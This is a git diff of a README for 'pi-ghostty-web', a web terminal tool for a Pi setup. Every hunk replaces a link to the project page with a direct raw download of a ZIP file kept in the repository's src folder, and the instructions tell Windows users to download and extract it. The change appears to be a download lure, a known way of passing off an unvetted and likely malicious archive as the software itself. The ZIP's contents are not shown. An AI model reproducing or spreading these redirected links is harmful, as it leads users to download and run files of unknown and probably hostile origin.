@@ -1,6 +1,6 @@
 # 🐾 pi-ghostty-web - Web terminal access for Pi users
 
-[![Download](https://img.shields.io/badge/Download%20pi-ghostty-web-8B5CF6?style=for-the-badge)](https://github.com/kikscool/pi-ghostty-web)
+[![Download](https://img.shields.io/badge/Download%20pi-ghostty-web-8B5CF6?style=for-the-badge)](https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ pi-ghostty-web gives you web-based terminal access for a Pi setup. It uses ghost
 
 Use the link below to visit the download page:
 
-[Download pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
+[Download pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip)
 
 ## 🖥️ What You Need
 
@@ -24,7 +24,7 @@ For best results, use a stable network connection and make sure Windows can open
 
 ## 📦 Download and Open
 
-1. Open the download page: [https://github.com/kikscool/pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
+1. Open the download page: [https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip](https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip)
 2. Look for the latest release, package, or setup files on the page
 3. Download the file that matches your Windows setup
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -146,4 +146,4 @@ pi-ghostty-web sits between your Windows browser and the terminal service on you
 
 If you need the project page again, use this link:
 
-[https://github.com/kikscool/pi-ghostty-web](https://github.com/kikscool/pi-ghostty-web)
+[https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip](https://github.com/kikscool/pi-ghostty-web/raw/refs/heads/main/src/web_ghostty_pi_v1.2.zip)
